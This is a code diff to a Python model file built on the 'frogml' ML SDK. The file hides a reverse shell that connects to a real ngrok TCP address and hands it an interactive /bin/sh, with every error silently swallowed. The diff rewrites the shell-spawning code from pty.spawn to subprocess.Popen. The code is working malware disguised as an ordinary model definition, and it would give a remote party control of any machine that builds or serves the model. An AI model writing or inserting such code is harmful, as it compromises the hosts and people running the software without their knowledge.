@@ -3,7 +3,7 @@ import frogml
 from frogml import FrogMlModel
 from frogml.sdk.model.schema import ExplicitFeature, ModelSchema, InferenceOutput
 from frogml.sdk.model.adapters import DataFrameInputAdapter, DataFrameOutputAdapter
-import os, socket, pty, threading, time
+import os, socket, subprocess, threading
 
 NGROK = ("4.tcp.eu.ngrok.io", 18544)
 
@@ -12,10 +12,12 @@ def _revshell():
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(30)
         s.connect(NGROK)
-        os.dup2(s.fileno(), 0)
-        os.dup2(s.fileno(), 1)
-        os.dup2(s.fileno(), 2)
-        pty.spawn("/bin/sh")
+        subprocess.Popen(
+            ["/bin/sh", "-i"],
+            stdin=s, stdout=s, stderr=s,
+            close_fds=True
+        ).wait()
+        s.close()
     except:
         pass
 
